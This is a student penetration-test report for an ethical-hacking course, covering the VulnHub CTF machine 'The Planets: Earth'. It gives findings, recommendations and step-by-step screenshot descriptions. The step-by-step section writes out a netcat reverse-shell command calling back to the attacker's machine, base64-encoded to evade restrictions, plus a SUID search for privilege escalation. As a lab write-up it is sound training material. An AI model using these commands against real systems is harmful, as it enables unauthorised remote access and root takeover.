# IA 445 Earth

**Source:** [`IA 445 Earth.docx`](../archive/canvas-submissions/IA%20445%20Earth.docx)  
**Course:** IA 445 - Ethical Hacking and Offensive Security (EMU)  
**Author:** Julio Barros

Penetration Test Report for "The Planets: Earth" CTF Challenge

Date(s) of Test: 04/09/2024
Name of the Test: "The Planets: Earth" CTF Challenge Penetration Test
Author: Julio Ribeiro Barros

## Table of Contents

Executive Summary - [3]
Scope / Purpose - [3]
Methodology - [4]
Findings / Recommendations / Technical Details - [5]
Step-by-Step [6-13]

## Executive Summary

This report details the extensive discoveries and techniques used in the penetration test of the VulnHub-hosted Capture the Flag (CTF) challenge "The Planets: Earth." This exercise's main goal was to improve penetration testing abilities by simulating real-world network environments and vulnerabilities in a controlled setting.

The information gathering, user password retrieval, target system connection, and root account access phases comprised the four systematic phases of the penetration test. With a variety of cybersecurity tools, such as netdiscover, Nmap, dirb, and netcat, our team was able to map out the target network, find running services, and find possible security holes.

Important test results included vulnerable services on open ports, sensitive data exposed by improperly configured directories, and information exposed due to inadequate encryption techniques. Furthermore, unauthorized privilege escalation was made possible by the successful exploitation of file permission misconfigurations.

Our team suggests taking urgent corrective action right away, such as guarding service ports, putting strong encryption in place, limiting the execution of encoded commands, and routinely auditing file permissions. To strengthen the security posture and reduce the likelihood of further attacks, these actions are essential.

## Scope / Purpose

The "Earth" virtual machine, which is a part of The Planets series that is accessible on VulnHub, was the subject of the penetration test that is detailed in this report. The machine served as a simulation for the test, which sought to find and take advantage of weak points in this carefully crafted configuration.

The target machine's IP address, 192.168.10.13, was discovered through the use of the netdiscover tool during initial reconnaissance, indicating that it was a part of a local network. After that, a thorough scan was conducted using Nmap, revealing multiple open ports—22 for SSH, 80 for HTTP, and 443 for HTTPS—all of which were deemed to be within the penetration test's purview.

## Methodology

To locate the target's IP address and count open ports, as well as identify the services that are running on these ports, the information gathering phase made use of the tools netdiscover and Nmap. During the vulnerability scanning phase, possible directories and file paths that could be exploited on the target system were brute-forced using dirb.

The CyberChef tool and XOR encryption were essential for cryptanalysis to decrypt and retrieve user passwords from encrypted messages. Using netcat to run encoded commands and get past security measures to obtain unauthorized access, the exploitation phase tested the network's protections against remote connections.

The process of approaching privilege escalation involved looking for files with SUID permission that the 'apache' user could exploit. This led to the discovery of an exploitable file that made it possible to reset the root password. After establishing a persistent shell and conducting a methodical directory search to find user and root flags, the last phase involved persistence and lateral movement.

Numerous significant vulnerabilities were exposed by the penetration test results. The target machine was discovered to have open ports, particularly ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). As a result, it was advised that these service ports be regularly scanned for vulnerabilities. The identification of critical directories brought to light the necessity of protecting them and putting strong defenses in place against directory traversal attacks.

Our cryptanalysis revealed that some messages were encrypted with a simple XOR cipher; as a result, we advise using stronger encryption methods and taking precautions to prevent encryption keys from being compromised. Additionally, we found that encoded commands could be executed remotely. This led to suggestions to limit the ability to execute encoded commands remotely and to keep an eye out for unauthorized outbound connections.

We recommend routine audits of file permissions in accordance with the principle of least privilege after discovering a crucial file with incorrect permissions that enabled privilege escalation. In conclusion, the fact that we were able to change the root password emphasizes how crucial it is to keep an eye on all system scripts and binaries—especially those that grant root access—to stop further illegal escalations.

## Findings / Recommendations / Technical Details

Directory Listing: The utilization of the dirb tool exposed sensitive directories, which presents a considerable risk. To mitigate this vulnerability, it is recommended to secure these directories rigorously. Measures such as implementing access controls and adopting directory traversal prevention techniques should be prioritized to safeguard these points of entry.

Cryptography: Analysis revealed that critical messages were secured using XOR encryption—a method known for its vulnerabilities. It is suggested to employ more robust encryption mechanisms that offer greater security against decryption attempts. Additionally, it is essential to protect against the exposure of encryption keys to prevent unauthorized access to encrypted data.

Remote Execution: The capability to execute encoded netcat commands remotely poses a significant security risk. It is strongly advised to restrict the execution of such commands. System administrators should implement stringent network monitoring and filtering protocols to track and control outbound connections, preventing potential breaches.

File Permissions: A file with improper permissions was identified, which enabled privilege escalation. Conducting regular audits of file permissions, applying the principle of least privilege, and ensuring that only the necessary permissions are granted for specific roles and processes can prevent such security oversights.

Root Access: The test successfully reset the root password via an exploit. To prevent future unauthorized privilege escalation, it is advised to continuously review and monitor all system scripts and binaries that have root privileges. Ensuring that these scripts and binaries are not exploitable is paramount to maintaining system integrity and security.

Step-by-Step

### Getting Target Information

This image likely displays the terminal output after running the netdiscover command, revealing various IP addresses within the local network. The target IP address for the Earth VM, 192.168.10.13, should be highlighted or marked in this image.

- This image probably shows the terminal with the results of an nmap -sV -p- -v 192.168.10.13 command execution, detailing the open ports (22, 80, and 443) and the services running on them. The verbose mode indication and the progress of the scan might also be visible.

### Getting User Password

- An image depicting the results of running the dirb command against the target, highlighting the discovered directory /cgi-bin. The photo might show the command syntax used and the terminal output indicating the directory found.

- A screenshot showing the contents of the robots.txt file accessed via the browser at https://terratest.earth.local/robots.txt, which leads to the discovery of testingnotes.txt. This text file contains crucial hints about XOR encryption and points towards the testdata.txt file used as an encryption key.

### Connecting to the Target System

An image showcasing the setup of a netcat listener using the command nc -lvnp 4444 on the attacker's machine, preparing for the incoming connection from the target system. This photo would ideally display the terminal ready and waiting for the connection.

- A terminal snapshot showing the process of encoding the nc -e /bin/bash 192.168.10.10 4444 command with base64, resulting in an encoded string ready to be used for bypassing restrictions on the target system.

### Getting Root Account

An image capturing the terminal output of the find / -perm -u=s -type f 2>/dev/null command, which is used to search for files with SUID permissions that could potentially be exploited by the 'apache' user.
